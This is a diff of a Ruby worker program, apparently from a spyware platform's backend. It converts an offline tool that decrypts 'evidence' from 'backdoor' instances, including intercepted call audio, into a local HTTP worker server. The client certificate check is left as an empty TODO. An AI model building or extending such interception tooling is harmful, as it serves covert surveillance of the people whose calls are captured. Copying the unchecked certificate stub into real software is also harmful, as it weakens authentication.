@@ -2,101 +2,217 @@
 # The main file of the worker
 #
 
+# relatives
+require_relative 'audio_processor'
+require_relative 'evidence/call'
+require_relative 'parser'
+
+# from RCS::DB
+require 'rcs-db/config'
+
 # from RCS::Common
 require 'rcs-common/trace'
-require 'rcs-common/evidence'
-require 'rcs-common/evidence_manager'
-
-# from RCS::Audio
-require 'rcs-worker/audio_processor'
-require 'rcs-worker/evidence/call'
+#require 'rcs-common/evidence'
+#require 'rcs-common/evidence_manager'
 
 # form System
 require 'digest/md5'
+require 'net/http'
 require 'optparse'
+
+require 'eventmachine'
+require 'evma_httpserver'
 
 module RCS
 module Worker
+
+Thread.abort_on_exception=true
+
+module HTTPHandler
+  include RCS::Tracer
+  include EM::HttpServer
+  include Parser
+  
+  attr_reader :peer
+  attr_reader :peer_port
+  
+  def post_init
+    # don't forget to call super here !
+    super
+
+    # timeout on the socket
+    set_comm_inactivity_timeout 30
+
+    @request_time = Time.now
+
+    # to speed-up the processing, we disable the CGI environment variables
+    self.no_environment_strings
+
+    # set the max content length of the POST
+    self.max_content_length = 30 * 1024 * 1024
+
+    # get the peer name
+    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
+    @network_peer = @peer
+    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
+  end
+
+  def ssl_handshake_completed
+    trace :debug, "[#{@peer}] SSL Handshake completed successfully (#{Time.now - @request_time})"
+  end
+
+  def closed?
+    @closed
+  end
+
+  def ssl_verify_peer(cert)
+    #TODO: check if the client cert is valid
+  end
+
+  def unbind
+    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
+    @closed = true
+  end
+
+  def process_http_request
+    # the http request details are available via the following instance variables:
+    #   @http_protocol
+    #   @http_request_method
+    #   @http_cookie
+    #   @http_if_none_match
+    #   @http_content_type
+    #   @http_path_info
+    #   @http_request_uri
+    #   @http_query_string
+    #   @http_post_content
+    #   @http_headers
+
+    #trace :info, "[#{@peer}] Incoming HTTP Connection"
+    size = (@http_post_content) ? @http_post_content.bytesize : 0
+    trace :debug, "[#{@peer}] REQ: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time}) #{size.to_s_bytes}"
+
+    # get it again since if the connection is keep-alived we need a fresh timing for each
+    # request and not the total from the beginning of the connection
+    @request_time = Time.now
+
+    responder = nil
+
+    # Block which fulfills the request
+    operation = proc do
+
+      trace :debug, "[#{@peer}] QUE: [#{@http_request_method}] #{@http_request_uri} #{@http_query_string} (#{Time.now - @request_time})" if Config.instance.global['PERF']
+
+      generation_time = Time.now
+
+      begin
+        # parse all the request params
+        request = prepare_request @http_request_method, @http_request_uri, @http_query_string, @http_cookie, @http_content_type, @http_post_content
+
+        request[:peer] = @peer
+        request[:headers] = @http_headers.split("\x00")
+
+        # get the correct controller
+        controller = WorkerController.new
+        controller.request = request
+        
+        # do the dirty job :)
+        responder = controller.act!
+        
+        # create the response object to be used in the EM::defer callback
+
+        reply = responder.prepare_response(self, request)
+
+        # keep the size of the reply to be used in the closing method
+        @response_size = reply.content ? reply.content.bytesize : 0
+        trace :debug, "[#{@peer}] GEN: [#{request[:method]}] #{request[:uri]} #{request[:query]} (#{Time.now - generation_time}) #{@response_size.to_s_bytes}" if Config.instance.global['PERF']
+
+        reply
+      rescue Exception => e
+        trace :error, e.message
+        trace :fatal, "EXCEPTION(#{e.class}): " + e.backtrace.join("\n")
+
+        # TODO: SERVER ERROR
+        responder = RESTResponse.new(500, e.message)
+        reply = responder.prepare_response(self, request)
+        reply
+      end
+
+    end
+
+    # Callback block to execute once the request is fulfilled
+    response = proc do |reply|
+    	reply.send_response
+
+       # keep the size of the reply to be used in the closing method
+      @response_size = reply.headers['Content-length'] || 0
+    end
+
+    # Let the thread pool handle request
+    EM.defer(operation, response)
+  end
+
+end
 
 class Worker
   include Tracer
   
   attr_reader :type, :audio_processor
-  
-  def initialize(db_file, type)
-    
-    # db file where evidence to be processed are stored
-    @instance = db_file
-    
-    # type of evidences to be processed
-    @type = type
-    
-    @audio_processor = AudioProcessor.new
-    
-    trace :info, "Working on evidence stored in #{@instance}, type #{@type.to_s}."
-    
-  end
-  
-  def get_key()
-    
-  end
-  
-  def process
-    require 'pp'
-    
-    info = RCS::EvidenceManager.instance_info(@instance)
-    trace :info, "Processing backdoor #{info['build']}:#{info['instance']}"
-    
-    # the log key is passed as a string taken from the db
-    # we need to calculate the MD5 and use it in binary form
-    trace :debug, "Evidence key #{info['key']}"
-    evidence_key = Digest::MD5.digest info['key']
-    
-    evidence_sizes = RCS::EvidenceManager.evidence_info(@instance)
-    evidence_ids = RCS::EvidenceManager.evidence_ids(@instance)
-    trace :info, "Pieces of evidence to be processed: #{evidence_ids.join(', ')}."
-    
-    evidence_ids.each do |id|
-      binary = RCS::EvidenceManager.get_evidence(id, @instance)
-      trace :info, "Processing evidence #{id}: #{binary.size} bytes."
-      
-      # deserialize evidence
-      begin
-        evidence = RCS::Evidence.new(evidence_key).deserialize(binary)
-        mod = "#{evidence.type.to_s.capitalize}Processing"
-        evidence.extend eval mod if RCS.const_defined? mod.to_sym
-        
-        evidence.process if evidence.respond_to? :process
-        
-        case evidence.type
-          when :CALL
-            trace :debug, "Evidence channel #{evidence.channel} callee #{evidence.callee} with #{evidence.wav.size} bytes of data."
-            @audio_processor.feed(evidence)
-        end
-      rescue EvidenceDeserializeError => e
-        trace :info, "DECODING FAILED: " << e.to_s
-        # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-      rescue Exception => e
-        trace :fatal, "FAILURE: " << e.to_s
-        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-      end
-      
-    end
 
-    @audio_processor.to_wavfile
-    
-    trace :info, "All evidence has been processed."
+=begin
+  def resume
+    instances = EvidenceManager.instance.instances
+    instances.each do |instance|
+      trace :info, "Resuming remaining evidences for #{instance}"
+      ids = EvidenceManager.instance.evidence_ids instance
+      ids.each {|id| QueueManager.instance.queue(instance, id)}
+    end
   end
+=end
+  
+  def setup(port = 5150)
+    
+    # main EventMachine loop
+    begin
+
+      # process all the pending evidence in the repository
+      resume
+
+      # all the events are handled here
+      EM::run do
+        # if we have epoll(), prefer it over select()
+        EM.epoll
+        
+        # set the thread pool size
+        EM.threadpool_size = 50
+        
+        EM::start_server("127.0.0.1", port, HTTPHandler)
+        trace :info, "Listening on port #{port}..."
+        
+      end
+    rescue Interrupt
+      trace :info, "User asked to exit. Bye bye!"
+      return 0
+    rescue Exception => e
+      # bind error
+      if e.message.eql? 'no acceptor'
+        trace :fatal, "Cannot bind port #{Config.instance.global['LISTENING_PORT']}"
+        return 1
+      end
+      raise
+    end
+    
+  end
+
 end
 
 class Application
   include RCS::Tracer
   
   # To change this template use File | Settings | File Templates.
-  def run(options, file)
+  def run(options) #, file)
     
     # if we can't find the trace config file, default to the system one
-    if File.exist? 'trace.yaml' then
+    if File.exist? 'trace.yaml'
       typ = Dir.pwd
       ty = 'trace.yaml'
     else
@@ -119,44 +235,28 @@ class Application
     begin
       version = File.read(Dir.pwd + '/config/version.txt')
       trace :info, "Starting a RCS Worker #{version}..."
-      w = RCS::Worker::Worker.new(File.basename(file), options[:type])
-      w.process
+      
+      # config file parsing
+      return 1 unless RCS::DB::Config.instance.load_from_file
+      
+      # connect to MongoDB
+      #until RCS::DB::DB.instance.connect
+      #  sleep 5
+      #end
+
+      Worker.new.setup RCS::DB::Config.instance.global['WORKER_PORT']
     rescue Exception => e
       trace :fatal, "FAILURE: " << e.to_s
       trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
       return 1
     end
     
-    puts w.audio_processor
-    
     return 0
   end
   
   # we instantiate here an object and run it
   def self.run!(*argv)
-    # This hash will hold all of the options parsed from the command-line by OptionParser.
-    options = {}
-    
-    optparse = OptionParser.new do |opts|
-      # Set a banner, displayed at the top of the help screen.
-      opts.banner = "Usage: rcs-worker [options] <database file>"
-        
-      # Default is to process ALL types of evidence, otherwise explicit the one you want parsed
-      options[:type] = :ALL
-      opts.on( '-t', '--type TYPE', [:ALL, :DEVICE, :CALL], 'Process only evidences of type TYPE' ) do |type|
-        options[:type] = type
-      end
-      
-      # This displays the help screen, all programs are assumed to have this option.
-      opts.on( '-h', '--help', 'Display this screen' ) do
-        puts opts
-        exit
-      end
-    end
-    
-    optparse.parse!
-    
-    return Application.new.run(options, ARGV.shift)
+    return Application.new.run argv
   end
 end
 
